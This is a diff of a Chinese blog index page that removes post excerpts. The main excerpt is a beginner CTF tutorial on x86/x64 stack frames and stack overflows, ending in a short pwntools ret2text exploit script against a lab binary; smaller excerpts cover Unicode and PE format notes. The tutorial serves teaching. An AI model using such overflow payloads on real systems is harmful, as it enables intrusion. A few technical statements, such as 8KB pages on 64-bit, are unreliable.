@@ -75,182 +75,8 @@
   <div class="article-content">
     <div class="entry">
       
-        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>pwn这门课程简单来说就是通过二进制的形式去找到某台服务器存在哪些漏洞 与web不同的是他大部分的知识都是基于汇编组成的 在 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF-Wiki</a> 里面的介绍则是这样的:</p>
-<blockquote>
-<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p>
-<ul>
-<li>程序必须向栈上写入数据。</li>
-<li>写入的数据大小没有被良好地控制。</li>
-</ul>
-</blockquote>
-<p>则 栈的介绍如下：</p>
-<h2 id="基本栈介绍-¶"><a href="#基本栈介绍-¶" class="headerlink" title="基本栈介绍 ¶"></a>基本栈介绍 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/#_2">¶</a></h2><blockquote>
-<p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530150427160.png" alt="image-20250530150427160"></p>
-<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
-</blockquote>
-<p>这些是简单的栈介绍</p>
-<p>首先 栈是一种特殊的数据结构 他存储了 function runtime 的参数、变量和返回地址他在一次函数调用中是不可或缺的重要部分，其中软件的架构又分为两种</p>
-<p><code>x86</code> 和 <code>x64 </code></p>
-<p>这两种在参数和变量的在栈存储形式上有些不同 例如</p>
-<p><code>x86</code> 的所有参数通过 <strong>栈</strong> 从右到左依次压入 可用以下代码作为示例 使用 <code>visual stdio</code> 编译 x86 版本观查栈</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> _param1, <span class="type">int</span> _param2, <span class="type">int</span> _param3, <span class="type">int</span> _param4, <span class="type">int</span> _param5)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> _param1 + _param2 + _param3 + _param4 + _param5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;helloworld\n&quot;</span>;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530151556007.png" alt="image-20250530151556007"></p>
-<p>如图所示 我们定位到了 <code>main</code> 函数 然后我们在 <code>func </code> 处下断点 我们让他继续执行到<code>func</code> 执行到 <code>call</code>的时候我们观察栈的变化</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530151756664.png" alt="image-20250530151756664"></p>
-<p>如图所示 这是一个从低地址到高地址的显示方式 但是在入栈的时候 他是 <strong>从高地址到低地址从右往左参数依次入栈</strong></p>
-<p>然后我们进入call继续查看 进入call的同时我们发现 他先是压入了一个地址 这个地址就是 call 所在地址 + 5 的字节</p>
-<p>所以<code>call xxxxxxxx</code>就等效于 <code>push eip + 5</code> call的机器码占用一个字节 然而地址占用4个字节 其次又跳转到了 后面的地址处 所以call指令做了两件事 先是压入一个返回地址 接着又是进行了一次 <code>jmp</code> 跳转 然后我们接着看</p>
-<p>在跳转过来的函数头部我们发现了两条指令 <code>push ebp</code> <code>mov ebp esp</code> 那么这是什么意思呢？</p>
-<p>其实是 <code>典型的 x86 函数栈帧初始化</code> </p>
-<p>首先将当前的 <code>ebp</code> 寄存器的值压入栈 也就是保存上个函数的栈底地址 <code>(push ebp)</code></p>
-<p>之后把上个函数的栈顶作为当前函数的栈底 <code>(mov ebp esp)</code></p>
-<p>之后就是进行一系类的加法操作 到了 <code>pop ebp</code>的时候 就要销毁此栈帧恢复上一个函数的栈帧了</p>
-<p>然而我们可以发现 函数参数是通过 <code>ebp + n*4</code> 的方式进行访问的 这很关键</p>
-<p>直到执行到 <code>ret</code> 我们会发现 他的效果就等于 <code>jmp esp</code> 为什么这么说 我们接着分析栈</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/1f47c933242f43f4df4ea7487f699fc3.png" alt="1f47c933242f43f4df4ea7487f699fc3"></p>
-<p>我们可以发现现在 <code>esp=ebp</code> 为什么说 <code>ret</code> 是 <code>jmp [esp]</code>呢</p>
-<p>因为我们执行完 <code>pop ebp</code> 他就变成了这样</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530153731951.png" alt="image-20250530153731951"></p>
-<p>也就是返回到刚才call保存的返回值了 </p>
-<p>接着我们来看下<code>x64</code>的栈 </p>
-<p>x64分为两种编译器 在 <code>Linux、FreeBSD、macOS</code> 中普遍使用 <code>System V AMD64 ABI</code> </p>
-<ul>
-<li>前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
-<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
-</ul>
-<p>但在<code>Windows</code>上是 <code>Microsoft x64 calling convention</code> 也称作：</p>
-<ul>
-<li><p>Windows x64 ABI</p>
-</li>
-<li><p>Windows x64 调用约定</p>
-</li>
-</ul>
-<p>他的参数入栈形式如下</p>
-<ul>
-<li><p>前四个整型或指针参数依次保存在 <strong>RCX, RDX, R8, R9</strong>，如果还有更多的参数的话才会保存在栈上。</p>
-</li>
-<li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p>
-</li>
-</ul>
-<h2 id="🔍-System-V-AMD64-ABI-vs-Microsoft-x64-ABI-对比"><a href="#🔍-System-V-AMD64-ABI-vs-Microsoft-x64-ABI-对比" class="headerlink" title="🔍 System V AMD64 ABI vs Microsoft x64 ABI 对比"></a>🔍 System V AMD64 ABI vs Microsoft x64 ABI 对比</h2><table>
-<thead>
-<tr>
-<th>特性</th>
-<th>System V AMD64 ABI (Linux&#x2F;macOS)</th>
-<th>Microsoft x64 ABI (Windows x64)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>参数传递寄存器</td>
-<td>RDI, RSI, RDX, RCX, R8, R9</td>
-<td>RCX, RDX, R8, R9</td>
-</tr>
-<tr>
-<td>返回值</td>
-<td>RAX</td>
-<td>RAX</td>
-</tr>
-<tr>
-<td>栈空间</td>
-<td>被调用者必须保留 <code>red zone</code>（128 字节）</td>
-<td>无 red zone（不能用栈下方空间）</td>
-</tr>
-<tr>
-<td>调用者保存（volatile）寄存器</td>
-<td>RAX, RCX, RDX, RSI, RDI, R8–R11</td>
-<td>RAX, RCX, RDX, R8–R11</td>
-</tr>
-<tr>
-<td>被调用者保存（callee-saved）</td>
-<td>RBX, RBP, R12–R15</td>
-<td>RBX, RBP, RDI, RSI, R12–R15</td>
-</tr>
-<tr>
-<td>参数超过寄存器</td>
-<td>从第 7 个参数起压栈</td>
-<td>从第 5 个参数起压栈</td>
-</tr>
-<tr>
-<td>栈对齐要求</td>
-<td>16 字节</td>
-<td>16 字节</td>
-</tr>
-<tr>
-<td>栈传参对齐方式</td>
-<td>按参数自然大小</td>
-<td>所有参数按 8 字节对齐</td>
-</tr>
-<tr>
-<td>谁清理栈</td>
-<td>被调用者使用 <code>leave</code>+<code>ret</code></td>
-<td>调用者清理（隐含对齐）</td>
-</tr>
-</tbody></table>
-<p>我这边就用Windows用作演示</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530160001909.png" alt="image-20250530160001909"></p>
-<p>我们也是执行到 <code>func</code> 下断点 然后我们进入这个call</p>
-<p>我们会发现call的操作其实跟x86的call一样 也是 <code>push RIP + 5</code> 然后 <code>jmp 地址</code></p>
-<p>但是这个地址并不是一个绝对地址而是 <strong>相对地址</strong>。</p>
-<p><strong>相对地址跳转（RIP-relative）</strong></p>
-<h2 id="🧮-实际跳转地址计算方式"><a href="#🧮-实际跳转地址计算方式" class="headerlink" title="🧮 实际跳转地址计算方式"></a>🧮 实际跳转地址计算方式</h2><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标地址 = 下一条指令地址 + 偏移量</span><br><span class="line">偏移量 = 目标地址 - 下一条指令的地址</span><br><span class="line">下一条指令的地址 = 目标地址 - 偏移量</span><br></pre></td></tr></table></figure></blockquote>
-<p>假设当前 <code>EIP</code> 为 <code>0x1000</code>，也就是 <code>E8</code> 的位置</p>
-<p><code>E8</code> 占 1 字节，后面是 4 字节偏移量，下一条指令的地址是：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1000</span> + <span class="number">5</span> = <span class="number">0x1005</span></span><br></pre></td></tr></table></figure>
-
-<p>加上偏移量 <code>-0x97</code>：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1005</span> - <span class="number">0x97</span> = <span class="number">0xF6E</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="为什么不用绝对地址？"><a href="#为什么不用绝对地址？" class="headerlink" title="为什么不用绝对地址？"></a>为什么不用绝对地址？</h2><p>因为：</p>
-<ol>
-<li><strong>可重定位性更强</strong>：相对寻址无关内存基地址，适合代码段被加载到任意地址；</li>
-<li><strong>指令短</strong>：一个有符号 32 位偏移量足以跳转 ±2GB 的范围；</li>
-<li><strong>兼容 RIP-relative 模型</strong>：x64 强调基于 <code>RIP</code> 的寻址方式；</li>
-</ol>
-<p>根据这张图我们可以计算下 <code>偏移量</code></p>
-<p>也就是 目标地址(<code>00007FF76C6E15F0h</code>) - 下一条地址(<code>00007FF76C6E1687h</code>) &#x3D; 偏移量(<code>FFFF FFFF FFFF FF69h</code>)</p>
-<p>因为要的是一个32位整数 我们要 截断 也就是 <code>FFFF FFFF FFFF FF69h</code> &amp; <code>FFFF FFFFh</code></p>
-<p><code>&amp; 相同为1 不同为0</code></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xFFFFFFFFFFFFFF69</span> = <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">01101001</span></span><br><span class="line"><span class="number">0x00000000FFFFFFFF</span> = <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span> <span class="number">11111111</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>之后我们继续观察函数里面的内容</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530161550126.png" alt="image-20250530161550126"></p>
-<p>我们会发现 这边没有<code>push rbp mov rbp rsp</code> 这是为什么呢</p>
-<p>其实这是<strong>编译器优化</strong>的结果</p>
-<p>在 <strong>x64 系统下，编译器不一定使用帧指针（<code>rbp</code>）</strong>，因为：</p>
-<ul>
-<li>x64 有更多寄存器可用（16 个通用寄存器），不需要保留 <code>rbp</code>；</li>
-<li><code>rbp</code> 被当作普通寄存器用；</li>
-<li>栈偏移通过 <code>rsp + 偏移</code> 就可以直接访问，不需要 <code>rbp</code>；</li>
-<li>使用 <code>rbp</code> 反而浪费一个寄存器、增加指令数。</li>
-</ul>
-<p>首先就是拿出来参数放到栈上进行一系列加法之后到 <code>ret</code></p>
-<p>这里就是 <code>jmp [esp]</code>的值了</p>
-<p>至此对函数栈的简单介绍就到这里了 然后我们要思考一个问题 ​</p>
-<p><strong>假如函数的参数的大小是八个字节 但是我们输入了过多的字符 导致该参数占用10个字节 这会导致什么问题呢？</strong>🤔</p>
-<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>没错 这就导致了过多的字符覆盖了低地址处的栈空间 然而这就是 <code>栈溢出</code>  这个问题导致的漏洞危害极大 如果我们可以把输入的字符覆盖到返回地址也就是call保存的返回值处 然后我们刚好可以构造出一段恶意代码 并且让他跳转到含有关键数据的函数 例如 system 或者 拿到了shell权限 对于我们的服务器来说是一场致命打击 💥</p>
-<p>举个例子 假如我们手里刚好有一个这样的程序 刚好有一个可以被栈溢出的函数 我们可以用 <code>gdb</code>去测试一下</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530164438269.png" alt="image-20250530164438269"></p>
-<p>根据图中所示 我们可以先用<code>gdb</code>加载 然后再 <code>main</code>函数上下个断点</p>
-<p>我们输入 <code>r</code> 执行</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530164633031.png" alt="image-20250530164633031"></p>
-<p>他断到了这里然后我们一直走到 <code>gets</code> 这个函数</p>
-<p>为什么要走到 <code>gets</code> 呢 因为 <code>gets</code> 这个函数他是一个输入函数 他把值输入到了栈中 但是不限制输入大小 我们可以通过这个方式 去修改最后<code>ret</code>的值</p>
-<p>在此之前我们需要通过 <code>cyclic</code> 指令生成一堆杂乱的数据 方便我们后续直接定位栈偏移</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530164851352.png" alt="image-20250530164851352"></p>
-<p>使用 <code>ni</code> 指令单步</p>
-<p>执行到 <code>ret</code> 指令我们就继续使用 <code>cyclic -l </code>去计算他的偏移</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530172005605.png" alt="image-20250530172005605"></p>
-<p>然后这时候我们拿到了偏移量 那么怎么构造他的shell呢 这时候我们就要用 <code>pwntools</code> 了 <code>exp</code> 如下所示</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 载入库</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># 打开进程</span></span><br><span class="line">p = process(<span class="string">&#x27;ret2text&#x27;</span>)</span><br><span class="line"><span class="comment"># 附加调试器</span></span><br><span class="line"><span class="comment"># gdb.attach(p) 可以观看流程</span></span><br><span class="line"><span class="comment"># 构建 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(<span class="number">0x804863A</span>)</span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 用户交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>执行之后是这样的</p>
-<p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530172320533.png" alt="image-20250530172320533"></p>
-<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1>
+        <h1 id="PWN-简单栈溢出"><a href="#PWN-简单栈溢出" class="headerlink" title="PWN-简单栈溢出"></a>PWN-简单栈溢出</h1>
+        
       
     </div>
 
@@ -302,8 +128,8 @@
   <div class="article-content">
     <div class="entry">
       
-        <h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><p>Unicode是继ASCII字符编码后的另一种新型字符编码。严格意义上讲，ASCII码的每个字符使用7位表示Unicode则使用全16位表示一个字符。Unicode字符串中的每个字符均为双字节，所以又称为宽字符串。由于Unicode兼容ASCII字符，所以被大多数程序所支持，如Windows内核。Unicode的前128个字符码（十六进制，0x0000<del>0x007F）同ASCII码具有同样的字节值。比如，字母“a”的Unicode编码是Ox0061，而“a”的ASCII编码是Ox61。虽然占用的字节数不一样，但是两者的值是一样的。接下来的128个Unicode字符（代码为0x0080</del>0x00FF)是ISO8859-1对ASCII码的扩展。中国、日本和韩国的象形文字（总称为CJK）占用了0x3000~0x9FFF的代码。如“汉”字的Unicode编码是6C49h（其GB码为0BABAh)。使用一个字节来表示字符串中的字符，称为ANSI字符串。</p>
-
+        <h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1>
+        
       
     </div>
 
@@ -355,43 +181,8 @@
   <div class="article-content">
     <div class="entry">
       
-        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本帖子大部分出自书籍 《Windows PE权威指南》因需要复习PE知识 故此记录</p>
-<h1 id="PE-学习笔记-一"><a href="#PE-学习笔记-一" class="headerlink" title="PE 学习笔记(一)"></a>PE 学习笔记(一)</h1><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p>地址有四类，它们分别是：<br><strong>虚拟内存地址（VA)</strong><br><strong>相对虚拟内存地址（RVA）</strong><br><strong>文件偏移地址（FOA)</strong><br><strong>特殊地址</strong></p>
-<h6 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h6><blockquote>
-<p>32 位环境下的Windows内存管理<br>32位CPU的寻址能力为4GB（即2²个字节)，但有些用户的物理内存达不到这个值。<br>于是操作系统和CPU的内存管理单元共同作用，为用户提供了虚拟内存的管理机制。即分页机制。该机制可以让用户感觉自己好像在使用4GB的内存。</p>
-<p>分页机制的基本原理是：<br>操作系统假设一个进程独立拥有4GB内存，按照某个固定的大小（如4KB）将这4GB空间分成N（1M）个页。在某一时刻，所有这些页只有一部分和物理内存是对应的（所以这种机制允许物理内存比4GB小)。没有物理内存对应的页面被标记为脏(dirty)的页面，一般存储在一个名为“交换文件”的磁盘文件中。在WindowsXP系统中，交换文件为pagefile.sys，它位于系统盘的根目录，是一个系统隐藏文件。当系统需要读取未在内存中的数据时，这部分数据会将内存中不经常读写的页交换出内存，而把要读取的、位于交换文件中的页换进内存。通过这种存取机制可以让一个进程拥有比实际内存大得多的内存。利用这种机制管理的<br>内存称为虚拟内存。</p>
-</blockquote>
-<h2 id="虚拟内存地址"><a href="#虚拟内存地址" class="headerlink" title="虚拟内存地址"></a>虚拟内存地址</h2><p><strong>VA &#x3D; 进程基地址+相对虚拟内存地址</strong></p>
-<h2 id="相对虚拟内存地址"><a href="#相对虚拟内存地址" class="headerlink" title="相对虚拟内存地址"></a>相对虚拟内存地址</h2><p><strong>RVA &#x3D; 某个特定位置距离某个模块基地址的偏移量</strong></p>
-<h3 id="关于VA和RVA的概念如图所示"><a href="#关于VA和RVA的概念如图所示" class="headerlink" title="关于VA和RVA的概念如图所示"></a>关于VA和RVA的概念如图所示</h3><p><img src="/2025/05/29/PElearn/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="内存地址示意图.png"></p>
-<p>假设模块2的基地址为0x01000000，而模块2中的某个位置距离模块2的基地址偏移为400h，那么值0x00000400就是模块2中某个位置的RVA，而值0x01000400是该位置的VA。记住，RVA是相对于模块而言的，VA是相对于整个地址空间而言的。注意RVA与具体模块相关，它有一个范围，该范围从模块的开始到模块结束，脱离开这个范围的RVA是无效的，称为越界。越界的RVA地址没有任何意义。</p>
-<h2 id="文件偏移地址"><a href="#文件偏移地址" class="headerlink" title="文件偏移地址"></a>文件偏移地址</h2><p>文件偏移地址(File Offset Address, FOA) 和内存无关，它是<strong>指某个位置距离文件头的偏移。</strong></p>
-<h2 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h2><p>比较少见</p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="数据目录"><a href="#数据目录" class="headerlink" title="数据目录"></a>数据目录</h3><ul>
-<li>导出表</li>
-<li>导入表</li>
-<li>资源表</li>
-<li>异常表</li>
-<li>属性证书表</li>
-<li>重定位表</li>
-<li>调试数据</li>
-<li>Architecture</li>
-<li>Global Ptr</li>
-<li>线程局部存储</li>
-<li>加载配置表</li>
-<li>绑定导入表</li>
-<li>IAT</li>
-<li>延时导入表</li>
-<li>CLR运行时头部</li>
-</ul>
-<h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>主要是用来存放不同类型数据(代码、数据、常量、资源等) 不同节有不同的访问权限</p>
-<h3 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h3><p>数据在内存中的对齐、数据在文件中的对齐、资源文件中资源数据的对齐</p>
-<h4 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h4><p><strong>节在内存中的对齐单位必须至少是一个页的大小 32位 &#x3D; 4kb (1000h) 64位&#x3D;8kb (2000h)</strong></p>
-<h4 id="文件对齐"><a href="#文件对齐" class="headerlink" title="文件对齐"></a>文件对齐</h4><p><strong>节在文件中的对齐要小于内存中的对齐 通常会以一个物理扇区的大小作为对齐粒度的值也就是512字节 十六进制表示 (200h)</strong></p>
-<p>出于节约资源的考虑，<strong>操作系统允许节在内存和文件中的对齐尺寸不一致</strong>。这就直接造成了<strong>PE在文件中和在内存中的大小也会不一致</strong>。通常情况下，<strong>PE在内存中的尺寸要比在文件中的尺寸大</strong>。用户可以自己定义这些对齐的值。</p>
-<p><strong>如果内存对齐被定义为小于操作系统页的大小，则文件对齐和内存对齐的值必须一致！</strong></p>
-<h4 id="资源数据对齐"><a href="#资源数据对齐" class="headerlink" title="资源数据对齐"></a>资源数据对齐</h4><p>资源文件中，资源字节码部分一般要求以双字（4个字节）方式对齐</p>
-
+        <h1 id="PE-学习笔记-一"><a href="#PE-学习笔记-一" class="headerlink" title="PE 学习笔记(一)"></a>PE 学习笔记(一)</h1>
+        
       
     </div>
 
